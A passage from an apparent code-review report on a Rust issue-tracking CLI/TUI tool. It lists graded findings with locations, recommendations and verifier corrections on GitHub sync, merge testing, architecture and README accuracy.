- **Location:** `src/tui/app/actions.rs:38-49 (create_problem) and solve/approve paths; cf. src/commands/problem.rs:189-208`
- **Corrected location:** Create path: src/tui/app/actions.rs:40-46 vs src/commands/problem.rs:191-207 (accurate). Solve/dissolve: src/commands/problem.rs:582-596 and 616-633 gate auto_close_issue on the --github-close flag, not on auto_push config alone.
- **Problem:** The CLI create-problem handler wires the legacy fallback (auto_create_issue at problem.rs:202) before calling automation::run. The TUI create_problem only calls automation::run (actions.rs:46) and never invokes any hooks::auto_* function (grep of src/tui shows zero references). Consequently, a user with github.auto_push=true (and no explicit problem_created rule) gets a GitHub issue when creating a problem from the CLI but nothing when creating it from the TUI. The same asymmetry applies to auto-close on solve/dissolve. Explicit [[automation]] rules do fire in both, but the config-driven auto_push path is half-implemented.
- **Recommendation:** Centralize the auto_push fallback inside domain.rs (e.g., in create/solve helpers) so both CLI and TUI inherit it, or explicitly document that auto_push is CLI-only. Centralizing in the domain layer is cleaner since domain already owns event emission + automation::run.
- **Verifier correction:** Severity medium is fair. The create-problem asymmetry is exact and the recommendation to centralize in src/domain.rs is correct and the cleanest option (both front-ends already funnel solve/dissolve/approve through domain). Two corrections for the implementer: (1) The solve/dissolve auto-close is CLI-only because it requires the explicit --github-close flag, which the TUI never sets — not because of bare auto_push config; the finding over-describes the CLI trigger. (2) Centralizing in domain requires threading CommandContext (hooks need it; domain currently takes &MetadataStore) and adding a domain::create_problem helper (none exists today). The 'document auto_push is CLI-only' alternative is weaker given domain already exists as the natural home.

### 🟡 `MEDIUM` Built-in issue/PR creation has no partial-failure recovery — orphan remote object + duplicate on retry

**Category** correctness · **Effort** medium · **Verdict** 🟡 **partial** (high conf)

- **Location:** `src/sync/hooks.rs:19-30 (do_create_issue), 49-79 (do_create_or_update_pr)`
- **Problem:** do_create_issue calls provider.create_issue (network) then store.save_problem to persist github_issue. If save_problem fails after the issue is created on GitHub, the issue is orphaned: the problem has no github_issue link, so the next create attempt (retry, or auto_push on a later command) calls create_issue again and produces a SECOND duplicate issue. There is no title/dedup guard in create_issue (github/mod.rs:119 always creates). The same window exists in do_create_or_update_pr (PR created at mod.rs:129, then save_solution at hooks.rs:73). gh's create has no idempotency token, so jjj must guard it.
- **Recommendation:** Before creating, check for an existing remote object (e.g., list_unlinked_issues / search by a jjj-id marker label or title) and reconcile; or, if save_problem fails after a successful create, surface the issue number prominently so the user can manually relink (and record it in the automation-failures sidecar). At minimum, log the created number on save failure so it is recoverable.
- **Verifier correction:** Cited locations are correct. The strongest, most defensible part of the fix is the minimal one: surface/log the created issue/PR number when save fails, since currently the println announcing the number (hooks.rs:28) is skipped on the `?` error path, making the orphan number unrecoverable. The dedup-before-create suggestion is sound but heavier (extra `gh` round-trip on every create). Temper the "auto_push on a later command creates a second duplicate" claim — there is no generic automatic retrigger for unlinked problems in the normal command flow; the duplicate risk is via automation-rule re-fire or manual retry.

### 🟡 `MEDIUM` `jjj github pr --base <branch>` is silently ignored (base hardcoded to "main")

**Category** bug · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/sync.rs:371-377 (_base param), src/sync/github/mod.rs:133 (create_pr)`
- **Problem:** GitHubSyncAction::Pr exposes `--base` (cli.rs:990-992, default "main", user-overridable), but sync_pr binds it as `_base` and never uses it. SyncProvider::create_pr has no base parameter, and GitHubProvider::create_pr hardcodes `self.client.create_pr(&title, &body, branch, "main")`. A user on a repo whose default/integration branch is `develop` (or who passes --base develop) gets a PR opened against main regardless, which may target the wrong base or fail.
- **Recommendation:** Thread the base through: add a `base` parameter to SyncProvider::create_pr (and the GitHubProvider impl / client.create_pr already accepts base), and pass `_base` from sync_pr. Default to the repo's default branch rather than a hardcoded "main".

### 🟡 `MEDIUM` merge → approve_solution can re-fire github_merge automation on an already-merged PR

**Category** design · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/sync.rs:603-621 (sync_merge); src/domain.rs:110-111 (approve fires SolutionApproved automation)`
- **Problem:** sync_merge calls provider.merge_pr, then domain::approve_solution, which fires SolutionApproved automation (domain.rs:111). If the user configures a github_merge rule on solution_approved, do_merge_pr runs `gh pr merge` again on the now-merged PR, which exits non-zero and is recorded as an automation failure (sidecar + stderr warning). It does not loop (the failure is non-fatal), but it produces a confusing spurious error every merge. More generally, the built-in merge action is not idempotent: re-running on a merged PR errors rather than no-op'ing.
- **Recommendation:** Make do_merge_pr idempotent: check provider.pr_status first and return Ok(()) if already Merged. This also fixes the user-facing retry case for `jjj github merge`.

### 🔵 `LOW` GithubIssueCreated event type is never emitted; automation-driven create/close/PR emit no events

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/models/event.rs:32 (declared); src/commands/timeline.rs:112 (rendered); src/sync/hooks.rs (do_* emit nothing)`
- **Problem:** EventType::GithubIssueCreated is declared and has a timeline renderer, but no code path ever emits it (rg finds only the declaration, the automation no-op match arm, and the timeline arm). The explicit `jjj github` subcommands emit GithubPrCreated / GithubIssueClosed / GithubPrMerged / GithubIssueImported (sync.rs), but the automation/hook path (do_create_issue, do_close_issue, do_create_or_update_pr, do_merge_pr) emits NO events at all. So GitHub objects created via [[automation]] rules or auto_push leave no trace in the timeline/events log, undermining the audit story. Also: the with_metadata wrapper in do_create_or_update_pr (hooks.rs:73) sets no pending event, so it is effectively a no-op there.
- **Recommendation:** Emit the corresponding Github* event inside each do_* hook (wrapped in with_metadata so it flushes), and actually emit GithubIssueCreated in do_create_issue (or remove the dead variant). This makes automation-driven GitHub changes auditable and consistent with the explicit commands.

### 🔵 `LOW` gh failures only special-case auth; rate-limit / network errors surface as generic command failures

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/sync/github/client.rs:66-78 (execute error handling)`
- **Problem:** GhClient::execute detects only auth failures (stderr contains "auth login"/"not logged") and otherwise returns a generic GhCommandFailed. GitHub rate limiting (HTTP 403 'API rate limit exceeded') and transient network errors produce GhCommandFailed with raw stderr and no retry/backoff. In sync_push/sync_pull these are caught per-operation and warned, so a rate-limit burst mid-sync silently skips many entities (recorded as failures), and the user must re-run. There is no rate-limit-aware messaging or retry.
- **Recommendation:** Detect 'rate limit' in stderr and return a distinct, actionable error (suggest waiting / `gh api rate_limit`). Optionally add a small bounded retry-with-backoff for idempotent reads (issue_status/pr_status). Low priority since per-op isolation already prevents a single failure from aborting the whole sync.

### 🔵 `LOW` sync_push reconciliation trusts parse_issue_state's unknown-defaults-to-Closed, risking spurious reopen

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/sync/github/mapping.rs:212-217 (parse_issue_state); src/commands/sync.rs:778-838`
- **Problem:** parse_issue_state maps any non-OPEN string (including empty) to Closed. issue_status returns success on any gh exit-0. If gh ever returns an empty or unexpected `state` value while still exiting 0 (e.g., a partial response or a future gh field rename), an Open problem would be seen as live_status=Closed and reopen_issue would be invoked — a remote-mutating action based on a parse default. Low likelihood given --jq .state, but the default silently converts ambiguity into a write.
- **Recommendation:** Have parse_issue_state return Result/Option and treat an unrecognized state as an error (skip reconciliation for that issue) rather than silently assuming Closed when about to perform a reopen write. Keep the lenient default only for read-only display paths.


---

## 11. Test coverage & quality

**Dimension summary:** The suite is sizable (231 integration tests across 28 files + ~297 unit tests in src) and genuinely good in several pure-logic areas: ranking/Borda math (borda.rs has 13 well-reasoned numeric assertions), FTS/RRF search, cosine similarity, automation template/shell-escape expansion, and embeddings are all properly gated (no live-network/Ollama dependence — embeddings are inserted manually). However, the single highest-risk new subsystem — the three-way merge that prevents silent data loss on fetch — is the weakest-tested relative to its risk. merge_entity_md has good unit coverage of common cases, but its key-deletion branches and its end-to-end integration in fetch.rs (base-snapshot lifecycle across multiple fetch cycles, conflict-marker surfacing, malformed-frontmatter handling) have ZERO tests, and no integration test ever has two users edit the SAME entity concurrently. Secondary gaps: the TUI action handlers (actions.rs, mod.rs, navigation.rs) have no unit tests at all, the ranking TUI/QV-reorder logic is tested via re-implemented copies rather than production code, and the github e2e test mutates a real shared remote repo (doug/jjjtest) making it non-hermetic. Several integration assertions are over-tolerant ("succeeds OR contains 'Invalid'"), weakening their bug-catching power.


### 🟠 `HIGH` Three-way merge integration (fetch.rs) has zero end-to-end tests; no test ever has two users edit the same entity

**Category** testing · **Effort** medium · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `medium`**

- **Location:** `src/commands/fetch.rs:17-47 (merge_entity_into_local); tests/push_fetch_test.rs:212-282`
- **Corrected location:** src/commands/fetch.rs:17-47 (merge_entity_into_local, untested glue) — note the merge core in src/storage/merge.rs:92-363 IS covered by 14 unit tests at merge.rs:373-596
- **Problem:** The recently-added three-way merge is the project's data-loss safeguard, yet the function that actually drives it on fetch — merge_entity_into_local — and the surrounding base-snapshot lifecycle are completely untested. tests/push_fetch_test.rs:test_push_fetch_roundtrip is the only multi-user fetch test, and Alice/Bob edit DIFFERENT entities (Alice a problem, Bob a solution), so merge_entity_md is never invoked with two genuinely-diverged versions of the same file. The conflict-marker path (fetch.rs:114-119, 180-189), the base advancement across multiple consecutive fetch cycles (write_base_file/snapshot_base ordering), and 'no local file -> adopt remote' branch all run only in production, never in CI. A regression that silently picks one side over the other, fails to advance the base, or drops the conflict-marker detection would pass the entire suite.
- **Recommendation:** Add an integration test in push_fetch_test.rs where Alice and Bob both fetch a shared problem, then EACH edits its body and a scalar (e.g. title/priority), both push, both fetch, and assert: (a) tag/list unions survive, (b) a body-only divergence yields conflict markers and fetch prints the warning, (c) a scalar divergence resolves by updated_at, (d) a second fetch cycle is a no-op (base advanced correctly). Also add a unit test calling merge_entity_into_local directly against a tempdir to cover the no-local-file and base-advancement branches.
- **Verifier correction:** Keep the proposed fix — both the same-entity-divergence integration test and a direct unit test for merge_entity_into_local (no-local-file adopt-remote branch + base advancement across consecutive fetch cycles) are real coverage gains. Just scope the rationale to "glue + integration wiring untested," not "merge logic untested," since merge.rs already has thorough unit tests for conflict markers, scalar LWW, tag union, and base snapshot primitives.

### 🟠 `HIGH` merge_mapping key-add/key-delete branches (lines 252-260) are untested — direct correctness risk for entity relationships

**Category** testing · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/merge.rs:252-260; tests at src/storage/merge.rs:397-513`
- **Problem:** merge_mapping has four subtle resolution branches: remote-deleted-key with local unchanged (drop), remote-deleted with local edited (keep local), and the symmetric local-deleted cases. None of these are exercised by any test. The existing unit tests only cover scalar-value conflicts via updated_at, tag/sequence union, and body merge. Key deletion vs. concurrent edit is exactly the scenario most likely to silently lose or resurrect a field (e.g., one user clears 'assignee' or 'milestone_id' while another edits 'priority'). Similarly, merge_sequence's documented semantics — 'items removed on one side and unchanged on the other are dropped' vs. union of additions — are only tested for the pure-addition case (tags_added_on_both_sides_unioned); the removal-vs-addition interaction on relationship lists (solution_ids, critique_ids, child_ids) is untested, despite directly governing graph integrity.
- **Recommendation:** Add table-driven unit tests for each merge_mapping branch: (1) base has key K, remote drops K, local unchanged -> K absent; (2) base has K, remote drops K, local edits K -> local value kept; (3) symmetric local-drop cases; and a merge_sequence test where base=[a,b,c], local removes b, remote adds d -> assert exact result. These are pure functions, so the tests are cheap and high-value.

### 🟡 `MEDIUM` TUI action handlers (actions.rs, mod.rs, navigation.rs, related.rs) have no unit tests

**Category** testing · **Effort** medium · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/tui/app/actions.rs (0 tests); src/tui/app/mod.rs (0); src/tui/app/navigation.rs (0); src/tui/app/related.rs (0)`
- **Corrected location:** Real duplication: production fns at src/tui/app/actions.rs:1762 (reorder_by_votes) and src/tui/app/actions.rs:1638-1644 (assign_tier index math) vs test-local copies at src/ranking/ordering.rs:406 and src/ranking/ordering.rs:317. tree.rs is at src/tui/tree.rs (not src/tui/app/).
- **Problem:** The TUI key-action dispatch (approve/dismiss/solve, selection, vote, tier/bubble moves) lives in actions.rs and the app state machine in mod.rs, with zero unit tests. The only TUI logic that IS tested is editor.rs (24), tree.rs (62), and next_actions.rs (30). The ranking-relevant TUI behaviors (assign_tier index math, vote three-zone reorder) ARE tested in ordering.rs — but via re-implemented copies (simulate_assign, reorder_by_votes) defined inside the test module, NOT the production functions, so a divergence between the test copy and the real handler would go undetected. Per project MEMORY, TUI accept_solution has a critique-check guard that was a deliberate correctness fix; nothing exercises it as a unit.
- **Recommendation:** Extract the index-math and vote-reorder logic into pub(crate) functions in production (or call the real handler), and have the existing ordering.rs tests target those instead of local copies. Add focused tests for actions.rs covering the critique-blocks-accept guard and selection toggling using a constructed App fixture.
- **Verifier correction:** Correct test counts: editor.rs=12, tree.rs=31, next_actions.rs=15, ordering.rs=24 (finding doubled the first three). The valuable, accurate part of the recommendation: extract reorder_by_votes and the tier remove/insert math into pub(crate) functions and have the existing ordering.rs tests call the production code instead of byte-identical copies (real divergence risk — those TUI functions have no test coverage at all today, unit or integration). Drop the critique-guard rationale: that logic lives in domain::approve_solution (domain.rs:52-67) and is already covered by tests/negative_tests.rs:129 and tests/workflow_test.rs; the TUI handler (actions.rs:869) merely delegates via dispatch_domain. Severity better as low-to-medium since the riskiest behavior has indirect integration coverage.

### 🟡 `MEDIUM` Several negative/integration assertions are over-tolerant, weakening their ability to catch regressions

**Category** testing · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `tests/negative_tests.rs:35-39,72-76; tests/concurrent_writers_test.rs:169-181`
- **Problem:** Multiple assertions accept either of two outcomes, so a real regression can slip through. negative_tests.rs:35 asserts `!success || combined.contains("Invalid")` — if the command erroneously SUCCEEDS but happens to print the word 'Invalid' anywhere, the test passes; conversely it can't distinguish 'rejected for the right reason' from 'crashed'. concurrent_writers_test.rs:test_concurrent_push_is_serialized explicitly accepts the success branch as 'acceptable' (the lock didn't matter because dry-run skips sync), so the test asserts essentially nothing about the lock it claims to verify. concurrent_writers_test also early-returns silently when jj is absent, so on a machine without jj the whole concurrency suite is a no-op with no skip signal.
- **Recommendation:** Tighten to assert the command failed AND the message matches the specific expected text. For the push-lock test, drive a code path that actually takes the lock (not --dry-run) so the lock-held branch is genuinely exercised, or test PidLock at the unit level. Replace silent `if !jj_available() { return; }` early returns with an explicit skip print so absent-prerequisite runs are visible.
- **Verifier correction:** The dead/misleading success branch in test_concurrent_push_is_serialized (lines 169-171) is worth fixing, but for the opposite reason the finding states: its comment claims dry-run skips sync_meta_to_bookmark, which is false — push.rs calls sync_meta_to_bookmark (and acquires the PidLock) at line 239 before the dry_run check at line 241. The right fix is to delete that dead branch and unconditionally assert the lock-held message, since dry-run reliably hits the lock. The negative_tests.rs assertions are a fair, accurate nit (the "Invalid status transition" message is stable, so tightening to failure+message is safe). The silent jj-absent skip is real but cosmetic. Locations cited are correct.

### 🟡 `MEDIUM` GitHub e2e test is non-hermetic: mutates a real shared remote repo and depends on network/replication timing

**Category** testing · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `tests/github_sync_e2e_test.rs:14,206-213; tests/scripts/multi-user-review-test.sh`
- **Problem:** github_sync_e2e_test.rs creates and mutates issues on a real shared GitHub repo (doug/jjjtest) and sleeps 2s waiting for GraphQL replication (line 213). This makes the test (a) non-runnable by other contributors / in generic CI, (b) flaky under replication-lag (2s is a guess), and (c) capable of leaving orphaned issues if the process is killed before the Drop cleanup guard runs. It is correctly gated behind prerequisites_met(), so it skips cleanly, but that means in most environments this 478-line test contributes zero coverage. The multi-user-review-test.sh shell script (26KB) is not wired into `cargo test` or any CI invocation, so its scenarios run only if someone manually executes it.
- **Recommendation:** Add a stub-gh-based variant (PATH-shimmed `gh` returning canned JSON) so the GitHub sync mapping/state-reconciliation logic gets deterministic coverage in normal CI, reserving the live test for an opt-in env flag. Replace the fixed sleep with a poll-until-visible loop. Document/wire multi-user-review-test.sh into a CI job or convert its key assertions into a Rust integration test.

### 🔵 `LOW` events.jsonl merge is unit-tested but never validated in the real fetch path; ordering/tiebreak determinism untested at integration level

**Category** testing · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/commands/fetch.rs:134-143; tests/events_test.rs`
- **Problem:** merge_events_jsonl has two good unit tests (dedup+sort, swap-invariance). But the integration in fetch.rs that reads local events, unions with remote, and only rewrites if changed is untested, and events_test.rs only checks event emission/storage, not cross-repo merge. Because events are append-only and merged by exact-line dedup, a subtle issue (e.g., trailing-whitespace differences producing duplicate-looking lines, or unparseable lines sorting to the end and reordering history) would not be caught. Lower severity because the event log is advisory rather than load-bearing for state.
- **Recommendation:** Extend the proposed multi-user fetch integration test to also assert events.jsonl after both fetches contains the union of both users' events exactly once, in timestamp order. Add a unit test for a line that differs only by trailing whitespace to lock in the trim_end dedup behavior.

### 🔵 `LOW` No property/fuzz tests for merge determinism and ranking math despite strong invariants

**Category** testing · **Effort** medium · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/merge.rs:92-121; src/ranking/borda.rs:31-101`
- **Problem:** Both the merge and the aggregation have explicit, documented invariants ideal for property testing but currently covered only by hand-picked examples. Merge claims byte-identical output regardless of argument order (only one example test, output_is_byte_identical_regardless_of_argument_order, and only for the tag-union no-scalar-conflict case) and idempotence (merge(base, x, x) == x — untested). Borda aggregation has clear properties: permutation-invariance of input ordering map, monotonicity of QV contribution, and the budget cutoff. A proptest harness over random YAML mappings/sequences and random orderings would surface edge cases (non-string scalars, nested maps, NaN-free score ties) that the ~13 example tests cannot.
- **Recommendation:** Add proptest (dev-dependency) generators for arbitrary entity YAML and arbitrary UserOrdering maps. Assert: merge swap-invariance and idempotence; aggregate_rankings is invariant to HashMap iteration order and produces a total deterministic order. These directly harden the two riskiest pure subsystems.


---

## 12. Architecture & elegance

**Dimension summary:** The codebase is, on the whole, cleanly layered and the recent refactors (the `Persist` trait, `domain.rs` as the shared CLI/TUI lifecycle seam, `query_ids_or_fallback`, strum Display) genuinely pull their weight — they collapsed real duplication and the dependency graph is acyclic (storage←automation←commands, TUI delegates to domain). The two strongest architectural problems are: (1) core ranking-algorithm logic is trapped in the TUI layer (`actions.rs`) instead of the `ranking` module, to the point its own module's tests had to copy it; and (2) the "markdown is canonical, SQLite is a derived index" contract is quietly violated by a bidirectional `dump_to_markdown` path where SQLite writes back to markdown during fetch/push. Secondary themes: the db layer still has the 4×4 entity CRUD duplication that the `Persist` trait eliminated in storage, "entity type" is stringly/charly-typed and hand-matched in 5+ places, and `actions.rs` (1930 lines) bundles three unrelated subsystems. mapping.rs (833) and entities.rs (891) are large mostly due to tests and are fine. Most findings are medium: real maintainability drag, not correctness emergencies.


### 🟠 `HIGH` Core ranking algorithm is trapped in the TUI layer, not the ranking module

**Category** design · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/tui/app/actions.rs:1762 (reorder_by_votes) and ~1368-1919 (whole tier/vote/undo subsystem); duplicated in src/ranking/ordering.rs:406`
- **Problem:** The three-zone vote reorder — the heart of the documented ranking model ('[positive by magnitude][unvoted][negative by magnitude]') — lives as a private method on the TUI `App` struct (`reorder_by_votes`, `assign_tier`, `adjust_vote`, `default_ordering_for_milestone`, `reorder/undo`). The `ranking/ordering.rs` module, which owns `UserOrdering` and is supposed to own ranking logic, does NOT contain this algorithm; instead its test module at line 406 contains a byte-for-byte copy with the comment 'Replicate the three-zone reorder logic for testing.' This is a backwards layer dependency: domain logic is stranded in the UI, and the domain module can only test it by duplicating it. Any change to the ranking rule must be made in the TUI and re-copied into the ranking test, and the CLI `rank` path cannot reuse it.
- **Recommendation:** Move `reorder_by_votes`, the tier-assignment math, vote-adjustment/quadratic-cost, and `default_ordering_for_milestone` into `src/ranking/ordering.rs` as pure functions/methods on `UserOrdering` (e.g. `UserOrdering::apply_vote`, `::assign_tier`, `::reorder`). Have `actions.rs` and `commands/rank.rs` both call them. Delete the test-only copy and test the real implementation. This is the single highest-leverage refactor for elegance: it puts the ranking domain where its tests and both front-ends can reach it.

### 🟠 `HIGH` Two-source-of-truth: SQLite writes back to markdown via dump_to_markdown, inverting the 'cache is derived' contract

**Category** design · **Effort** medium · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `medium`**

- **Location:** `src/db/sync.rs:89 (dump_to_markdown); callers src/commands/fetch.rs:70, src/commands/push.rs:218; dirty flag src/db/sync.rs:422-470`
- **Problem:** lib.rs and storage/mod.rs document SQLite as a purely derived, rebuildable cache for search/embeddings. But `dump_to_markdown` reads entities OUT of SQLite and writes them back into the canonical markdown files, gated by a `dirty` flag, during fetch and push. This makes SQLite a second writable source of truth for a window of time. Two concrete risks follow: (a) round-trip fidelity — markdown body fields (description/approach/argument) are reconstructed from SQLite columns plus `populate_*_computed_fields`, so any field not faithfully stored+restored in the DB silently degrades on dump; (b) the contract becomes 'markdown is canonical EXCEPT when the DB is dirty', which is far harder to reason about than 'DB is always rebuildable from markdown'. The fetch flow even deletes and rebuilds the .db immediately after (fetch.rs:155-160), so the dump exists only to flush an in-DB edit buffer that, by the stated architecture, should never have existed.
- **Recommendation:** Decide and enforce a single direction. Either (a) make all entity mutations write markdown-first (they already do via `MetadataStore::save`), so the DB can never be the sole holder of an edit and `dump_to_markdown`/`is_dirty`/`set_dirty` can be deleted entirely; or (b) if some path really edits only the DB, document it as an explicit exception and add a round-trip test asserting load→dump→load is identity for every field. Given save() already updates both, option (a) looks achievable and would remove a whole subsystem (dirty flag + dump path).
- **Verifier correction:** Severity should be medium, not high: there is no reachable path that produces a DB-only edit, so the "two source of truth window" the finding warns about does not actually occur in normal operation. The real, narrower issue is that fetch's dump_to_markdown-on-dirty can write a partially-loaded/stale DB back over canonical markdown when a prior load_from_markdown was interrupted — a latent correctness risk worth fixing, but rare and opposite in direction to what the finding describes. A correct rewrite of the finding should (1) note that `dirty` means "interrupted bulk load," (2) flag the dump-back-over-canonical-markdown as the actual hazard, and (3) note the sync.rs and schema.rs dirty checks share the same meta row, so removing it must account for needs_rebuild().

### 🟡 `MEDIUM` db/entities.rs repeats the 4-way entity CRUD that the Persist trait eliminated in storage

**Category** design · **Effort** large · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/db/entities.rs:57-512 (upsert/load/list/delete × problem/solution/critique/milestone, ~16 near-identical fns)`
- **Problem:** The storage layer's big win was the `Persist` trait collapsing four near-identical CRUD blocks into one generic implementation. The db layer never got that treatment: `upsert_problem/solution/critique/milestone`, `load_*`, `list_*`, `delete_*`, and `row_to_*` are sixteen hand-written functions with the same INSERT-OR-REPLACE / SELECT / DELETE shape, differing only in column lists. The SQL column tuples and the `to_string()`/`parse_enum` conversions are copied per type, so adding a field means editing the upsert, the load SELECT, the list SELECT, and the row mapper for that type — four parallel edits — and adding a 5th entity means a whole new ~120-line block. This is the largest remaining structural duplication and the asymmetry with the now-clean storage layer is glaring.
- **Recommendation:** Introduce a column-schema descriptor per entity (column names + a serialize/deserialize pair) or a small `DbEntity` trait analogous to `Persist`, so upsert/load/list/delete become generic over the entity. At minimum, define the column list as a single `const` per entity and share it between the upsert and the two SELECTs to kill the column-list triplication. This mirrors the Persist refactor and is the natural next step the trait work should have absorbed.

### 🟡 `MEDIUM` Entity type is stringly/charly-typed and hand-matched in 5+ dispatch sites

**Category** elegance · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/display.rs:50-58, src/db/sync.rs:279-290, src/commands/search.rs:177, src/db/search.rs:418, src/commands/next.rs:46, src/commands/mod.rs:194; real enum only at src/tui/next_actions.rs:49`
- **Problem:** There are three parallel representations of 'which of the four entity types': a `&str` ('problem') used in storage/db/automation, a `char`/`&str` prefix ('p') used for display, and a proper `enum EntityType` that exists ONLY in the TUI's next_actions module. Because there is no single shared enum, the same four-arm mapping is open-coded in many places: `"problem" => "problems"` (table name) in both db/sync.rs:280 and search.rs:177, `"problem" => "p"` in display.rs:52, `"problem" => SELECT...` in db/search.rs:418, plus `.chars().next()` prefixing in mod.rs:194. The `Persist` trait already centralizes `ENTITY_TYPE`/`DIR` constants but none of these sites use it. A fifth entity type would require touching every one of these matches, and a typo in any string ('problm') is a silent runtime miss rather than a compile error.
- **Recommendation:** Promote a single crate-level `EntityType` enum (move next_actions' enum up to models or a new `entity.rs`) with methods `dir()`, `table()`, `prefix_char()`, `tag()`, `From<&str>`/`Display`. Replace the open-coded matches with method calls; have `Persist::ENTITY_TYPE` return it. This turns the four-place fan-out into one definition and makes adding an entity a compiler-guided change.

### 🟡 `MEDIUM` actions.rs (1930 lines) bundles three unrelated subsystems in one impl block

**Category** design · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/tui/app/actions.rs (entity CRUD ~25-960, tags/confidence ~261-512, ranking/tier/vote/undo ~1368-1919)`
- **Problem:** The single `impl App` block in actions.rs mixes (1) entity create/edit/delete/lifecycle dispatch, (2) tag and confidence editing, and (3) the entire personal-ranking subsystem (tier assignment, votes, bubble, drill, undo) — roughly 550 lines of ranking alone. These share almost no state beyond `self.store`/`self.ui` and have different change cadences. The file is the largest in the repo and the ranking portion is exactly the logic that finding #1 says belongs in the ranking module. As-is it is hard to navigate and review, and the mixed concerns obscure that the ranking methods are pure transformations that don't need `App` at all.
- **Recommendation:** Split into focused submodules under tui/app/: `actions_entity.rs` (CRUD + lifecycle dispatch), `actions_ranking.rs` (the thin TUI glue), after extracting the ranking algorithm to the ranking module per finding #1. Tags/confidence can join the entity file. Each becomes a separate `impl App` block, which Rust allows across files in the same module.

### 🔵 `LOW` with_metadata threads a dead `_message` param through 68 call sites and provides no transactionality

**Category** elegance · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/mod.rs:812-819 (def); 68 call sites across domain.rs, commands/*, tui/app/*`
- **Problem:** `with_metadata(&self, _message: &str, operation)` is documented as: the message 'is unused at present' and the body is just `let r = operation()?; self.commit_changes()?; Ok(r)`. Yet every one of ~68 call sites constructs and immediately discards a `format!("Approve solution {}", id)` string. Beyond the wasted allocations and noise, the abstraction implies an atomic 'metadata transaction' but provides none: a panic or early return between a `save_*` (which writes markdown immediately) and the closing `commit_changes` leaves markdown mutated and events unflushed. So the helper neither uses its message nor delivers the atomicity its name suggests.
- **Recommendation:** Either drop the `message` parameter (simplest — removes 68 format! allocations) or actually use it to annotate the event-log batch as the comment promises. Separately, if atomicity is the intent, write events to a temp buffer alongside the entity write and commit both together; if it is not, rename to `commit_after` to stop implying transactionality.

### 🔵 `LOW` ensure_meta_checkout is a misleading no-op alias for ensure_meta_dirs

**Category** elegance · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/mod.rs:618-620, called at 436/455/489/632/648`
- **Problem:** `ensure_meta_checkout` does nothing but `self.ensure_meta_dirs()`. The name strongly implies it checks out / materializes the metadata from the `jjj` bookmark (which would matter given the shadow-graph design), but it only `create_dir_all`s the four entity dirs. It is almost certainly a vestige from when metadata was checked out from a bookmark into the working set. Today it is a pure indirection whose name actively misleads a reader about what guarantees the load/save paths have (it does NOT ensure the latest committed metadata is present, only that empty dirs exist).
- **Recommendation:** Inline `ensure_meta_dirs` at the call sites and delete `ensure_meta_checkout`, or — if a real checkout step is intended to exist — implement it. Keeping a no-op with a name promising a checkout is a latent correctness trap for the next person who assumes load() sees committed-but-not-materialized data.

### 🔵 `LOW` domain.rs lifecycle functions repeat identical event/with_metadata/automation scaffolding

**Category** elegance · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/domain.rs:126-333 (submit/withdraw/solve/dissolve/reopen/address/validate/dismiss)`
- **Problem:** Eight of the nine lifecycle functions follow the exact same shape: current_user → build Event → with_metadata { set_pending_event(clone); load entity; mutate; save } → automation::run(store, &event, id). Only the mutate line and the EventType differ. This is the good kind of design (one place per operation) but the boilerplate is dense enough that a small generic helper would make the meaningful difference (which state transition fires) stand out. approve_solution legitimately differs (auto-solve cascade) and should stay bespoke.
- **Recommendation:** Add a `transition<T>(store, id, event_type, mutate: impl FnOnce(&mut T) -> Result<()>)` helper that does the load/event/save/automation wrapper, and reduce each of the simple functions to one call passing the mutation closure. Leave approve_solution as-is. Low priority — current form is correct and readable, just repetitive.


---

## 13. Docs accuracy & build hygiene

**Dimension summary:** Documentation is broadly accurate on the big-picture model (Popperian P→S→C, shadow-graph storage layout, state machines all match the code), and the docs/ reference tree is even covered by a `tests/doc_test.rs` harness that executes `bash,test` blocks. However there is concrete, demonstrable drift in three places: (1) the README has two command examples that would actually fail or misbehave if a user copy-pasted them (`problem duplicate` and `solution comment`), and the README is NOT covered by the doc test harness; (2) the VS Code extension's TypeScript still declares and renders five entity fields (context/tradeoffs/evidence/goals/success_criteria) that were deliberately removed from the Rust models, so its interfaces are wrong and those sections are now dead; (3) a runtime error message points the user at a removed `jjj rank session` subcommand. Build hygiene is mostly clean (release clippy is green, profile is sensible) but has real gaps: Cargo declares `[build-dependencies]` with no `build.rs` to use them, CI runs Linux-only (violating the project's stated macOS+Linux support) and never lints test code, there is no MSRV enforcement despite a declared rust-version, and install.sh contains a dead exit-status check. None of these are data-loss or security issues; the highest-impact items are the broken README examples and the stale VS Code extension.


### 🟠 `HIGH` README `problem duplicate` example is wrong — would fail at the CLI

**Category** docs · **Effort** trivial · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `medium`**

- **Location:** `README.md:85`
- **Problem:** The README documents `jjj problem duplicate "Search" "Other"` with two positional arguments. The actual CLI (src/cli.rs:489-497, ProblemAction::Duplicate) takes a single positional `problem_id` plus a REQUIRED `--of <id>` flag. Running the documented form would error because `--of` is missing and `"Other"` has no positional slot. A user copy-pasting the Quick-Start-adjacent example hits an immediate failure.
